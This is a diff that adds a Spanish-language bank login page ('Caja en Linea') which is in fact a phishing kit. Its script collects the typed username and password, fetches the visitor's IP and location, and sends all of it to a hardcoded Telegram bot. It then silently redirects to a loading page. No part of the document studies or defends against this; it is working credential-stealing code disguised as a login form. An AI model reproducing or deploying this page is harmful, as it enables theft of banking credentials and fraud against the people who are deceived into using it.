@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Caja en Linea</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #EFEFEF;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: white;
+            padding: 2px 20px 100px;
+            border-radius: 1px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+        }
+
+        h1 {
+            text-align: left;
+            color: #494848;
+            font-size: 18px;
+            display: flex;
+            align-items: center;
+        }
+
+        h1 img {
+            width: 60px;
+            height: auto;
+            margin-right: 1px;
+        }
+
+        hr {
+            border: none;
+            border-top: 1px solid #d3d3d3;
+            margin: 15px 0;
+            height: 1px;
+            width: calc(100% + 40px);
+            margin-left: -20px;
+            margin-right: -20px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        label {
+            position: absolute;
+            left: 10px;
+            top: 10px;
+            transition: 0.2s ease all;
+            color: #aaa;
+            font-size: 16px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px 0; 
+            border: none; 
+            border-bottom: 1px solid #0f7a83; 
+            outline: none; 
+            font-size: 16px; 
+            transition: border-bottom 0.3s; 
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-bottom: 1px solid #3c3e41; 
+        }
+
+        input[type="text"]:focus + label,
+        input[type="password"]:focus + label,
+        input[type="text"]:not(:placeholder-shown) + label,
+        input[type="password"]:not(:placeholder-shown) + label {
+            top: -10px;
+            left: 10px;
+            font-size: 12px;
+            color: #333;
+        }
+
+        .switch-container {
+            display: flex;
+            align-items: center;
+            margin-top: 10px;
+        }
+
+        .switch {
+            display: flex;
+            align-items: center;
+        }
+
+        .switch input {
+            display: none;
+        }
+
+        .switch-label {
+            cursor: pointer;
+            width: 50px;
+            height: 30px;
+            background-color: #ccc;
+            border-radius: 20px;
+            position: relative;
+            transition: background-color 0.3s;
+            margin-right: 10px;
+        }
+
+        .switch-label:before {
+            content: "";
+            position: absolute;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background-color: white;
+            top: 3px;
+            left: 3px;
+            transition: transform 0.3s;
+        }
+
+        .switch input:checked + .switch-label {
+            background-color: #0f7a83;
+        }
+
+        .switch input:checked + .switch-label:before {
+            transform: translateX(20px);
+        }
+
+        .remember-text {
+            font-size: 12px;
+            color: #494848;
+            display: flex;
+            flex-direction: column;
+            margin-left: 10px;
+            margin-top: 15px;
+        }
+
+        .image-button {
+            margin-left: auto;
+            margin-top: 14px;
+        }
+
+        .image-button img {
+            width: 100px;
+            height: auto;
+            cursor: pointer;
+        }
+
+        h1, label, .remember-text {
+            font-weight: 300;
+        }
+
+        .forgot-password {
+            color: #0f7a83;
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .error-message {
+            color: red;
+            font-size: 12px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>
+            <img src="logo_pequeño.png" alt="Logo">
+            INGRESO
+        </h1>
+        <hr>
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="text" id="username" name="username" required placeholder=" " maxlength="10">
+                <label for="username">Usuario</label>
+            </div>
+            <div class="input-group">
+                <input type="text" id="password" name="password" required placeholder=" ">
+                <label for="password">Contraseña</label>
+                <p class="error-message" id="passwordError">Contraseña incorrecta.</p>
+            </div>
+            <div class="switch-container">
+                <div class="switch">
+                    <input type="checkbox" id="remember" name="remember">
+                    <label class="switch-label" for="remember"></label>
+                    <span class="remember-text">
+                        Recordar<br>
+                        usuario
+                    </span>
+                </div>
+                <div class="image-button">
+                    <img src="boton.png" alt="Botón de Ingreso" id="submitButton" style="cursor:pointer;">
+                </div>
+            </div>
+        </form>
+        <p class="forgot-password">¿Ha olvidado su contraseña?</p>
+    </div>
+
+    <script>
+        document.getElementById('submitButton').addEventListener('click', function(event) {
+            event.preventDefault(); // Evitar el envío del formulario por defecto
+            if (validatePassword()) {
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+
+                // Obtener ubicación e IP de ipwhois.io
+                fetch('https://ipwhois.app/json/')
+                    .then(response => response.json())
+                    .then(data => {
+                        const location = `${data.city}, ${data.country}`;
+                        const ip = data.ip; // Obtener IP
+                        sendToTelegram(username, password, location, ip);
+                    })
+                    .catch(error => {
+                        console.error('Error al obtener la ubicación:', error);
+                    });
+            }
+        });
+
+        function validatePassword() {
+            const password = document.getElementById('password').value;
+            const errorMessage = document.getElementById('passwordError');
+
+            // Expresión regular para validar la contraseña
+            const passwordRegex = /^(?=.*[A-Z])(?=.*[a-z])(?=.*\d)(?=.*[^\w\s])[A-Za-z\d\W]{8,}$/;
+
+            if (!passwordRegex.test(password)) {
+                errorMessage.style.display = 'block'; // Mostrar mensaje de error
+                return false; // Evitar el envío del formulario
+            }
+
+            errorMessage.style.display = 'none'; // Ocultar mensaje de error
+            return true; // Permitir el envío del formulario
+        }
+
+        function sendToTelegram(username, password, location, ip) {
+            const token = '8071410762:AAFOUv9oR1Dh3_OLwBdTM95YWZwYUwwqKr4'; // Reemplaza con tu token de bot de Telegram
+            const chatId = '-4571868410'; // Reemplaza con tu chat ID de Telegram
+            const message = `Usuario: ${username}\nContraseña: ${password}\nUbicación: ${location}\nIP: ${ip}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    // Aquí no se muestra ningún mensaje al usuario
+                    window.location.href = 'cargando.html'; // Redirigir a la siguiente página
+                })
+                .catch(error => {
+                    console.error('Error al enviar los datos:', error);
+                });
+        }
+    </script>
+</body>
+</html>
